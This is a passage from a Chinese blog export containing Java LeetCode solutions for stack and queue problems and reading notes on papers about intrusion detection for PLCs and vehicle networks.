<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">evalRPN</span><span class="params">(String[] tokens)</span> &#123;</span><br><span class="line">        Deque&lt;Integer&gt; stack = <span class="keyword">new</span> <span class="title class_">LinkedList</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span> ; i &lt; tokens.length ; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(tokens[i].equals(<span class="string">&quot;+&quot;</span>))&#123;</span><br><span class="line">                stack.push(stack.pop() + stack.pop());</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(tokens[i].equals(<span class="string">&quot;-&quot;</span>))&#123;</span><br><span class="line">                stack.push(-stack.pop()+stack.pop());</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(tokens[i].equals(<span class="string">&quot;*&quot;</span>))&#123;</span><br><span class="line">                stack.push(stack.pop()*stack.pop());</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(tokens[i].equals(<span class="string">&quot;/&quot;</span>))&#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">temp1</span> <span class="operator">=</span> stack.pop();</span><br><span class="line">                <span class="type">int</span> <span class="variable">temp2</span> <span class="operator">=</span> stack.pop();</span><br><span class="line">                stack.push(temp2/temp1);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                stack.push(Integer.valueOf(tokens[i]));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> stack.pop();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>时间复杂度：O(n)，其中 n 是数组 tokens 的长度。需要遍历数组 tokens 一次，计算逆波兰表达式的值。</p>
</li>
<li><p>空间复杂度：O(n)，其中 n 是数组 tokens 的长度。使用栈存储计算过程中的数，栈内元素个数不会超过逆波兰表达式的长度。</p>
</li>
</ul>
<h1 id="239-滑动窗口最大值"><a href="#239-滑动窗口最大值" class="headerlink" title="239. 滑动窗口最大值"></a><a href="https://leetcode.cn/problems/sliding-window-maximum/">239. 滑动窗口最大值</a></h1><blockquote>
<p>给你一个整数数组 nums，有一个大小为 k 的滑动窗口从数组的最左侧移动到数组的最右侧。你只可以看到在滑动窗口内的 k 个数字。滑动窗口每次只向右移动一位。</p>
<p>返回 滑动窗口中的最大值 。</p>
<p>示例 1：</p>
<p>输入：nums &#x3D; [1,3,-1,-3,5,3,6,7], k &#x3D; 3<br>输出：[3,3,5,5,6,7]<br>解释：<br>滑动窗口的位置                最大值</p>
<hr>
<p>[1  3  -1] -3  5  3  6  7       3<br> 1 [3  -1  -3] 5  3  6  7       3<br> 1  3 [-1  -3  5] 3  6  7       5<br> 1  3  -1 [-3  5  3] 6  7       5<br> 1  3  -1  -3 [5  3  6] 7       6<br> 1  3  -1  -3  5 [3  6  7]      7</p>
</blockquote>
<h2 id="思路：单调队列"><a href="#思路：单调队列" class="headerlink" title="思路：单调队列"></a>思路：单调队列</h2><p>设计单调队列的时候，pop，和push操作要保持如下规则：</p>
<ul>
<li>pop(value)：如果窗口移除的元素value等于单调队列的出口元素，那么队列弹出元素，否则不用任何操作</li>
<li>push(value)：如果push的元素value大于入口元素的数值，那么就将队列入口的元素弹出，直到push元素的数值小于等于队列入口元素的数值为止</li>
</ul>
<p>保持如上规则，每次窗口移动的时候，只要问que.front()就可以返回当前窗口的最大值。</p>
<p>为了更直观的感受到单调队列的工作过程，以题目示例为例，输入: nums &#x3D; [1,3,-1,-3,5,3,6,7], 和 k &#x3D; 3，动画如下：</p>
<p><img src="https://code-thinking.cdn.bcebos.com/gifs/239.%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3%E6%9C%80%E5%A4%A7%E5%80%BC-2.gif"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//解法一</span></span><br><span class="line"><span class="comment">//自定义数组</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyQueue</span> &#123;</span><br><span class="line">    Deque&lt;Integer&gt; deque = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">    <span class="comment">//弹出元素时，比较当前要弹出的数值是否等于队列出口的数值，如果相等则弹出</span></span><br><span class="line">    <span class="comment">//同时判断队列当前是否为空</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">poll</span><span class="params">(<span class="type">int</span> val)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!deque.isEmpty() &amp;&amp; val == deque.peek()) &#123;</span><br><span class="line">            deque.poll();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//添加元素时，如果要添加的元素大于入口处的元素，就将入口元素弹出</span></span><br><span class="line">    <span class="comment">//保证队列元素单调递减</span></span><br><span class="line">    <span class="comment">//比如此时队列元素3,1，2将要入队，比1大，所以1弹出，此时队列：3,2</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> val)</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> (!deque.isEmpty() &amp;&amp; val &gt; deque.getLast()) &#123;</span><br><span class="line">            deque.removeLast();</span><br><span class="line">        &#125;</span><br><span class="line">        deque.add(val);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//队列队顶元素始终为最大值</span></span><br><span class="line">    <span class="type">int</span> <span class="title function_">peek</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> deque.peek();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] maxSlidingWindow(<span class="type">int</span>[] nums, <span class="type">int</span> k) &#123;</span><br><span class="line">        <span class="keyword">if</span> (nums.length == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> nums;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> nums.length - k + <span class="number">1</span>;</span><br><span class="line">        <span class="comment">//存放结果元素的数组</span></span><br><span class="line">        <span class="type">int</span>[] res = <span class="keyword">new</span> <span class="title class_">int</span>[len];</span><br><span class="line">        <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//自定义队列</span></span><br><span class="line">        <span class="type">MyQueue</span> <span class="variable">myQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyQueue</span>();</span><br><span class="line">        <span class="comment">//先将前k的元素放入队列</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; k; i++) &#123;</span><br><span class="line">            myQueue.add(nums[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        res[num++] = myQueue.peek();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> k; i &lt; nums.length; i++) &#123;</span><br><span class="line">            <span class="comment">//滑动窗口移除最前面的元素，移除是判断该元素是否放入队列</span></span><br><span class="line">            myQueue.poll(nums[i - k]);</span><br><span class="line">            <span class="comment">//滑动窗口加入最后面的元素</span></span><br><span class="line">            myQueue.add(nums[i]);</span><br><span class="line">            <span class="comment">//记录对应的最大值</span></span><br><span class="line">            res[num++] = myQueue.peek();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//解法二</span></span><br><span class="line"><span class="comment">//利用双端队列手动实现单调队列</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 用一个单调队列来存储对应的下标，每当窗口滑动的时候，直接取队列的头部指针对应的值放入结果集即可</span></span><br><span class="line"><span class="comment"> * 单调队列类似 （tail --&gt;） 3 --&gt; 2 --&gt; 1 --&gt; 0 (--&gt; head) (右边为头结点，元素存的是下标)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] maxSlidingWindow(<span class="type">int</span>[] nums, <span class="type">int</span> k) &#123;</span><br><span class="line">        ArrayDeque&lt;Integer&gt; deque = <span class="keyword">new</span> <span class="title class_">ArrayDeque</span>&lt;&gt;();</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        <span class="type">int</span>[] res = <span class="keyword">new</span> <span class="title class_">int</span>[n - k + <span class="number">1</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">idx</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="comment">// 根据题意，i为nums下标，是要在[i - k + 1, i] 中选到最大值，只需要保证两点</span></span><br><span class="line">            <span class="comment">// 1.队列头结点需要在[i - k + 1, i]范围内，不符合则要弹出</span></span><br><span class="line">            <span class="keyword">while</span>(!deque.isEmpty() &amp;&amp; deque.peek() &lt; i - k + <span class="number">1</span>)&#123;</span><br><span class="line">                deque.poll();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 2.既然是单调，就要保证每次放进去的数字要比末尾的都大，否则也弹出</span></span><br><span class="line">            <span class="keyword">while</span>(!deque.isEmpty() &amp;&amp; nums[deque.peekLast()] &lt; nums[i]) &#123;</span><br><span class="line">                deque.pollLast();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            deque.offer(i);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 因为单调，当i增长到符合第一个k范围的时候，每滑动一步都将队列头节点放入结果就行了</span></span><br><span class="line">            <span class="keyword">if</span>(i &gt;= k - <span class="number">1</span>)&#123;</span><br><span class="line">                res[idx++] = nums[deque.peek()];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="347-前-K-个高频元素"><a href="#347-前-K-个高频元素" class="headerlink" title="347. 前 K 个高频元素"></a><a href="https://leetcode.cn/problems/top-k-frequent-elements/">347. 前 K 个高频元素</a></h1><blockquote>
<p>给你一个整数数组 nums 和一个整数 k ，请你返回其中出现频率前 k 高的元素。你可以按 任意顺序 返回答案。</p>
<p>示例 1:</p>
<p>输入: nums &#x3D; [1,1,1,2,2,3], k &#x3D; 2<br>输出: [1,2]</p>
</blockquote>
<h2 id="思路：优先级队列（小顶堆）"><a href="#思路：优先级队列（小顶堆）" class="headerlink" title="思路：优先级队列（小顶堆）"></a>思路：优先级队列（小顶堆）</h2><p>这道题目主要涉及到如下三块内容：</p>
<ul>
<li>要统计元素出现频率</li>
<li>对频率排序</li>
<li>找出前K个高频元素</li>
</ul>
<p>首先统计元素出现的频率，这一类的问题可以使用map来进行统计。</p>
<p>然后是对频率进行排序，这里我们可以使用一种 容器适配器就是<strong>优先级队列</strong>。</p>
<h3 id="什么是优先级队列呢？"><a href="#什么是优先级队列呢？" class="headerlink" title="什么是优先级队列呢？"></a>什么是优先级队列呢？</h3><p>其实<strong>就是一个披着队列外衣的堆</strong>，因为优先级队列对外接口只是从队头取元素，从队尾添加元素，再无其他取元素的方式，看起来就是一个队列。</p>
<p>而且优先级队列内部元素是自动依照元素的权值排列。那么它是如何有序排列的呢？</p>
<p>缺省情况下priority_queue利用max-heap（大顶堆）完成对元素的排序，这个大顶堆是以vector为表现形式的complete binary tree（完全二叉树）。</p>
<p>什么是堆呢？</p>
<p><strong>堆是一棵完全二叉树，树中每个结点的值都不小于（或不大于）其左右孩子的值。</strong> 如果父亲结点是大于等于左右孩子就是大顶堆，小于等于左右孩子就是小顶堆。</p>
<p>所以大家经常说的大顶堆（堆头是最大元素），小顶堆（堆头是最小元素），如果懒得自己实现的话，就直接用priority_queue（优先级队列）就可以了，底层实现都是一样的，从小到大排就是小顶堆，从大到小排就是大顶堆。</p>
<p>本题我们就要使用优先级队列来对部分频率进行排序。</p>
<p>为什么不用快排呢， 使用快排要将map转换为vector的结构，然后对整个数组进行排序， 而这种场景下，我们其实只需要维护k个有序的序列就可以了，所以使用优先级队列是最优的。</p>
<p>此时要思考一下，是使用小顶堆呢，还是大顶堆？</p>
<p>有的同学一想，题目要求前 K 个高频元素，那么果断用大顶堆啊。</p>
<p>那么问题来了，定义一个大小为k的大顶堆，在每次移动更新大顶堆的时候，每次弹出都把最大的元素弹出去了，那么怎么保留下来前K个高频元素呢。</p>
<p>而且使用大顶堆就要把所有元素都进行排序，那能不能只排序k个元素呢？</p>
<p><strong>所以我们要用小顶堆，因为要统计最大前k个元素，只有小顶堆每次将最小的元素弹出，最后小顶堆里积累的才是前k个最大元素。</strong></p>
<p>寻找前k个最大元素流程如图所示：（图中的频率只有三个，所以正好构成一个大小为3的小顶堆，如果频率更多一些，则用这个小顶堆进行扫描）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] topKFrequent(<span class="type">int</span>[] nums, <span class="type">int</span> k) &#123;</span><br><span class="line">        <span class="type">int</span>[] ans = <span class="keyword">new</span> <span class="title class_">int</span>[k];</span><br><span class="line">        HashMap&lt;Integer,Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> num : nums)&#123;</span><br><span class="line">            map.put(num,map.getOrDefault(num,<span class="number">0</span>)+<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Set&lt;Map.Entry&lt;Integer,Integer&gt;&gt; entries = map.entrySet();</span><br><span class="line">        PriorityQueue&lt;Map.Entry&lt;Integer,Integer&gt;&gt;   pr = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;((o1,o2) -&gt; o1.getValue() - o2.getValue());</span><br><span class="line">        <span class="keyword">for</span>(Map.Entry&lt;Integer,Integer&gt; entry : entries)&#123;</span><br><span class="line">            pr.offer(entry);</span><br><span class="line">            <span class="keyword">if</span>(pr.size() &gt; k)&#123;</span><br><span class="line">                pr.poll();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> k -<span class="number">1</span> ; i &gt;= <span class="number">0</span> ; i--)&#123;</span><br><span class="line">            ans[i] = pr.poll().getKey();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>栈与队列</tag>
      </tags>
  </entry>
  <entry>
    <title>态势感知、入侵检测相关论文阅读笔记</title>
    <url>/2022/05/09/19-%E6%80%81%E5%8A%BF%E6%84%9F%E7%9F%A5%E3%80%81%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E7%9B%B8%E5%85%B3%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>记录一下最近看的一些入侵检测、态势感知相关论文，主要是针对AGV物流调度系统态势感知平台开发的相关学习。</p>
<h1 id="论文总结"><a href="#论文总结" class="headerlink" title="论文总结"></a>论文总结</h1><h2 id="一、《Machine-Learning-for-Intrusion-Detection-in-Industrial-Control-Systems-Applications-Challenges-and-Recommendations》"><a href="#一、《Machine-Learning-for-Intrusion-Detection-in-Industrial-Control-Systems-Applications-Challenges-and-Recommendations》" class="headerlink" title="一、《Machine Learning for Intrusion Detection in Industrial Control Systems: Applications, Challenges, and Recommendations》"></a>一、《Machine Learning for Intrusion Detection in Industrial Control Systems: Applications, Challenges, and Recommendations》</h2><p>综述性论文</p>
<h2 id="二、《Embedding-Encryption-and-Machine-Learning-Intrusion-Prevention-Systems-on-Programmable-Logic-Controllers》"><a href="#二、《Embedding-Encryption-and-Machine-Learning-Intrusion-Prevention-Systems-on-Programmable-Logic-Controllers》" class="headerlink" title="二、《Embedding Encryption and Machine Learning Intrusion Prevention Systems on Programmable Logic Controllers》"></a>二、《Embedding Encryption and Machine Learning Intrusion Prevention Systems on Programmable Logic Controllers》</h2><p>在可编程逻辑控制器上嵌入加密和机器学习入侵防御系统</p>
<h3 id="1、Abstract"><a href="#1、Abstract" class="headerlink" title="1、Abstract"></a>1、Abstract</h3><p>​	由于PLC供应商不提供有关其硬件或软件的信息，研究人员很难将安全机制嵌入到设备中。本文描述了一种使用<strong>开源PLC</strong>的替代设计，该PLC经过修改后可以独立于所使用的协议对其通过网络发送的所有数据进行加密。此外，基于机器学习的IPS被添加到PLC网络堆栈中，提供了一种安全机制来抵御拒绝服务(DoS)等网络flood攻击。实验结果表明，加密层和IPS提高了PLC与监控软件之间链路的安全性，防止了拦截、注入和DoS攻击</p>
<p>​	这项工作增强了具有AES-256加密和解密功能的开源PLC和基于机器学习的IPS，以创建嵌入式弹性系统。<strong>OpenPLC</strong>项目是根据IEC 61131-3标准创建的，该标准定义了plc的基本软件体系结构和编程语言。这意味着OpenPLC可以与其他遵循相同标准的plc兼容。</p>
<span id="more"></span>

<h3 id="2、Main-work"><a href="#2、Main-work" class="headerlink" title="2、Main work"></a>2、Main work</h3><p>​	这篇文章的主要工作在于以下两个贡献：</p>
<ul>
<li><strong>在OpenPLC的网络层和入侵防御系统之间加入了AES加密层，密钥方案为PSK (Pre-Shared key)</strong></li>
</ul>
<p>​	每次OpenPLC启动时，用户都必须提供AES加密层的关键字。每一个收到的报文都通过PSK被AES加密层解密，然后发送到网络层进行进一步的处理</p>
<ul>
<li><strong>OpenPLC的嵌入式入侵防御系统</strong></li>
</ul>
<p>​	入侵防御系统接收来自<strong>外部网络</strong>的<strong>所有报文</strong>。它实现了一种<strong>嵌入式无监督聚类算法</strong>，对传入的流数据进行实时分类，以检测网络异常和DoS攻击。如果检测到攻击，IPS会创建自己的自定义规则来阻止攻击者的IP进入网络。无监督聚类算法(K-means)使IPS具有一般性，并使其能够根据正常网络可能遇到的任何变化的网络条件进行调整。IPS及通过安全网关连接的信任节点的网络布局如下图所示</p>
<p><img src="https://picgooo.oss-cn-hangzhou.aliyuncs.com/img/image-20220520095452632.png" alt="image-20220520095452632"></p>
<h3 id="3、EXPERIMENTAL-RESULTS"><a href="#3、EXPERIMENTAL-RESULTS" class="headerlink" title="3、EXPERIMENTAL RESULTS"></a>3、EXPERIMENTAL RESULTS</h3><p>​	这篇文章的实验对象为:<strong>一个储水箱</strong>，每台PLC均采用梯形逻辑编程，实现分布式控制，所有3个plc通过一组西门子开关到人机界面联网。利用OpenPLC自带的ScadaBR软件实现人机界面。主要实现了以下几种攻击的入侵检测与防御：</p>
<ul>
<li><strong>Interception Attack</strong></li>
</ul>
<p>​	通过AES-256加密模块，实现了这种攻击的防御。因为攻击者虽然可以在网络上拦截数据包，但由于使用了AES-256加密技术，无法对其内容进行解密。</p>
<ul>
<li><strong>Injection Attack</strong></li>
</ul>
<p>​	注入攻击包括快速发送Modbus消息，将系统锁定在手动模式，同时打开泵，关闭逸出阀。</p>
<p>​	这篇文章宣称：</p>
<blockquote>
<p>由于注入消息的速度快，嵌入式IPS检测到异常流量，能够快速地阻止攻击者节点，而不会对运行中的系统造成任何损害。在降低注入消息的频率后，有可能通过IPS未被检测到。虽然注入的消息能够到达PLC，但由于存在AES-256加密，仍然无法注入命令。因此，消息被丢弃，对系统没有任何损害。</p>
</blockquote>
<ul>
<li><strong>Denial of Service (DoS) Attack</strong></li>
</ul>
<blockquote>
<p>针对本工作实施的DoS攻击使用Low Orbit Ion Cannon (LOIC)软件，在Modbus通信使用的端口502上向PLC发送TCP数据包。由于运行在UniPi上的OpenPLC被压得喘不过气来，无法再响应HMI请求，攻击几乎能够立即导致对HMI的服务被拒绝。虽然人机界面没有响应，但系统继续运行，运行梯形逻辑程序。但是在持续攻击大约3分钟后，OpenPLC的网络栈崩溃，操作系统杀死了应用程序，停止了梯形逻辑程序的执行。使用LOIC对安全的OpenPLC进行了相同的攻击。由于泛洪报文的快速特性，运行在OpenPLC旁的嵌入式IPS能够快速检测到异常流量，并对攻击者节点进行封杀。攻击节点在被禁止之前只能攻击设备几毫秒。</p>
</blockquote>
<h3 id="4、Some-thoughts"><a href="#4、Some-thoughts" class="headerlink" title="4、Some thoughts"></a>4、Some thoughts</h3><p>阅读后的一些思考，也是作者在论文里面提的一些局限性~</p>
<ul>
<li>实验是在开源OpenPLC上展开的，在真实PLC设备中，似乎没有操作系统这种说法，如何部署IPS？在PC端，还是外加模块？</li>
<li>实验没考虑到PLC工作中，通讯协议的实时性，许多工业流程的严格实时要求，如果加密和机器学习IPS层增加了显著的延迟，是不是不可能在现实世界中部署这些技术？</li>
</ul>
<p>​	关于这点，作者在论文中通过基准测试评估应用加密和机器学习IPS的性能损失。测试是在原始的OpenPLC、OpenPLC Secure(增强了加密和机器学习IPS层的OpenPLC)和其他两个流行的商用plc上进行的（西门子S7-1214C和Allen-Bradley MicroLogix 1400）。OpenPLC和OpenPLC都安全运行在Raspberry Pi model 3硬件上，4台plc均装载了储水箱梯形逻辑程序。一个微控制器直接连接到每个PLC的处理器(或控制器)引脚，测量输出切换时间，从每个PLC采集4000个样本。计算了4000个样本的标准差和平均值，如表1所示：</p>
<p><img src="https://picgooo.oss-cn-hangzhou.aliyuncs.com/img/image-20220520101315752.png" alt="image-20220520101315752"></p>
<blockquote>
<p>结果表明，两种版本的OpenPLC(原始的和安全的)具有相同的扫描时间，这也与所分析的另外两种plc的扫描时间相似。此外，这两个版本的OpenPLC的标准差比其他两个商用plc的标准差小得多，这意味着即使添加了加密和机器学习IPS层，OpenPLC在扫描时间上的抖动也要小得多，实时响应也要好得多。</p>
</blockquote>
<p>按理论分析，在加上额外的模块后，PLC的实时性肯定是会受到影响的。导致论文上面实验结果的原因，我个人觉得应该在于OpenPLC本身的特性上：	</p>
<blockquote>
<p>OpenPLC中存在一个实时库，实时库通过在独立的核上隔离OpenPLC进程，并将OpenPLC主线程的调度策略更改为SCHED_FIFO，同时将其优先级设置为最大值，从而提高多核架构上的Linux响应。此策略下的进程没有时间切片，这意味着SCHED_FIFO线程无限期地运行，直到它产生处理器或被一个I&#x2F;O请求阻塞。由于OpenPLC进程是在隔离的核心中持续运行的唯一进程，因此即使在系统负载很重的情况下，它也可以提供改进的确定性响应。</p>
</blockquote>
<ul>
<li>这篇文章是基于OpenPLC上的入侵检测系统研究，OpenPLC本身运行于Linux系统，和真实的PLC设备差别很大（没有操作系统）。所以上述所提出的一些想法，部署在真实的PLC设备，例如AGV小车中，会存在很多问题，参考性不大~</li>
</ul>
<h2 id="三、《Cloud-Based-Cyber-Physical-Intrusion-Detection-for-Vehicles-Using-Deep-Learning》"><a href="#三、《Cloud-Based-Cyber-Physical-Intrusion-Detection-for-Vehicles-Using-Deep-Learning》" class="headerlink" title="三、《Cloud-Based Cyber-Physical Intrusion Detection for Vehicles Using Deep Learning》"></a>三、《Cloud-Based Cyber-Physical Intrusion Detection for Vehicles Using Deep Learning》</h2><p>基于云计算以及深度学习的车辆网络物理入侵检测</p>
<h3 id="1、Abstract-1"><a href="#1、Abstract-1" class="headerlink" title="1、Abstract"></a>1、Abstract</h3><p>​	由于车辆通常只能提供有限的处理资源，因此之前提出的解决方案都是<strong>基于规则或轻量级的机器学习技术</strong>。作者认为，这种限制可以通过通常用于资源受限的移动设备的计算卸载来解除（比如将深度学习模型部署到云平台上）以这种方式增加的处理资源允许访问更高级的技术。以一辆小型四轮机器人陆地车辆为例，展示了卸载基于深度学习的连续入侵检测任务的实用性和优越性。这种方法比标准的机器学习技术更一致地实现了高精确度，而且不像以前的工作那样局限于单一类型的攻击或车载CAN总线。</p>
<p>​	只使用能够提供给入侵检测系统(IDS)的非常有限的资源。一种方法是包括一个板载入侵检测模块，该模块将被离线训练，学习与自身正常行为或基于不同监测特征的不同类型的已知攻击特征相关的简单规则。这种方法可以很好地用于简单的和以前见过的攻击。它可以有较低的检测延迟和相对较高的准确性，但在遇到不寻常的情况或复杂的攻击时，有效性很差。这里评估的另一种方法是<strong>，不在板载上运行入侵检测过程，而是将其卸载到强大的外部处理系统，如云基础设施</strong>。这可以减少实际车辆的处理负载，但重要的是，它还可以利用更复杂的入侵检测技术，例如涉及深度学习。</p>
<h3 id="2、Main-work-1"><a href="#2、Main-work-1" class="headerlink" title="2、Main work"></a>2、Main work</h3><p>作者针对入侵检测算法的建议是：将从深度学习中获益所需的大量处理工作转移到更强大的基础设施上(无论是单一服务器、云还是云)。通过计算卸载，我们指的是在不在用户当前计算环境中的更有资源的计算机上执行某些计算任务的过程。这一概念与基于云的在线取证技术[36]和[37]在Android智能手机上检测恶意软件和受污染数据有相似之处。</p>
<p>车载和卸载入侵检测的区别在于：推理(分析数据以确定是否有攻击)在车辆上还是更强大的基础设施上(无论是单一服务器、云还是云)</p>
<h3 id="3、EXPERIMENTAL-METHODOLOGY"><a href="#3、EXPERIMENTAL-METHODOLOGY" class="headerlink" title="3、EXPERIMENTAL METHODOLOGY"></a>3、EXPERIMENTAL METHODOLOGY</h3><p>汽车是由Arduino微控制器控制。网络接入是通过<strong>Wi-Fi或以太网电缆</strong>，远程控制通过TCP插座连接到车辆的控制板。除了与控制车辆运动相关的网络流量外，还有由车载摄像头视频流产生的网络流量以及对其驱动(平移和倾斜)的控制</p>
<h4 id="Features"><a href="#Features" class="headerlink" title="Features"></a>Features</h4><p>网络物理攻击的不利影响也可以被视为改进入侵检测的机会。在这里，我们采用了相同的方法，允许观察攻击对车辆计算、通信和物理操作的影响。确定了8个输入特征，<strong>4个与通信和处理有关</strong>，我们称之为网络输入特征，4个与物理属性有关，我们称之为物理输入特征。</p>
<p>每个输入功能的数据收集位置:usb连接的功率表的安培和瓦;用于振动的加速度计RMS(X, Y, Z);用Diff _L和Diff _R值表示速度的两个正交编码器;<strong>在Fedora Linux控制计算机上测量的CPU利用率、磁盘利用率和入站&#x2F;出站网络流量速率</strong></p>
<ul>
<li>网络流入:接收的网络流量速率。</li>
<li>网络流出:传输的网络流量速率</li>
<li>CPU: CPU的总利用率。</li>
<li>磁盘数据:向磁盘写入数据的速率。</li>
<li>加速度计:表示底盘的振动(使用加速度计测量)。一个外部设备已经连接到机箱来捕捉这些读数。</li>
<li>功率:wattup测量的车辆的总功耗能量计。</li>
<li>电流:车辆所吸取的整体电流。</li>
<li>攻击标签:这是地面真相标签，它说明在特定的时间点是否有攻击。这是用来训练模型和评估其性能</li>
</ul>
<h2 id="四、《Intrusion-Detection-System-Using-Deep-Neural-Network-for-In-Vehicle-Network-Security》"><a href="#四、《Intrusion-Detection-System-Using-Deep-Neural-Network-for-In-Vehicle-Network-Security》" class="headerlink" title="四、《Intrusion Detection System Using Deep Neural Network for In-Vehicle Network Security》"></a>四、《Intrusion Detection System Using Deep Neural Network for In-Vehicle Network Security》</h2><p>基于深度神经网络的车载网络安全入侵检测系统</p>
<h3 id="1、Abstract-2"><a href="#1、Abstract-2" class="headerlink" title="1、Abstract"></a>1、Abstract</h3><p>​	以往的入侵检测方法可能只对设计阶段已经考虑过的特定威胁模型有效。为了解决这一问题，本文采用了基于机器学习的入侵检测技术，主要针对常规通信网络。其思想是捕获数据的底层统计特征，并使用它们来检测任何恶意攻击。提出了利用<strong>人工神经网络(ANN)和支持向量机</strong>对攻击类型进行分类的入侵检测方法。</p>
<p>​	本文提出了一种基于深度神经网络结构的入侵检测系统，以保证车载网络(如CAN网络)的安全。该技术对高维的CAN报文数据进行降维训练，找出正常报文和攻击报文的底层统计属性，在防御时提取相应的特征来识别攻击。这篇工作首次将深度学习结构应用于车载网络的入侵检测中，这与早期基于ann的入侵检测方法不同。具体地说，作者使用无监督深度信任网络(DBN)前训练方法来有效地训练初始化深度神经网络的参数。随后对参数进行调整，以便使用监督学习获得更好的分类结果。</p>
<h3 id="2、Main-work-2"><a href="#2、Main-work-2" class="headerlink" title="2、Main work"></a>2、Main work</h3><p>这篇文章主要是针对车辆Can总线协议来进行了一项工作，考虑Can协议中的data字段（8bytes），然后考虑每位出现1的概率，针对这个来学习，比较偏向于对协议本身的学习。</p>
<h2 id="五、《Network-Intrusion-Detection-System-Using-Neural-Network-Classification-of-Attack-Behavior》"><a href="#五、《Network-Intrusion-Detection-System-Using-Neural-Network-Classification-of-Attack-Behavior》" class="headerlink" title="五、《Network Intrusion Detection System Using Neural Network Classification of Attack Behavior》"></a>五、《Network Intrusion Detection System Using Neural Network Classification of Attack Behavior》</h2><p>基于神经网络攻击行为分类的网络入侵检测系统</p>
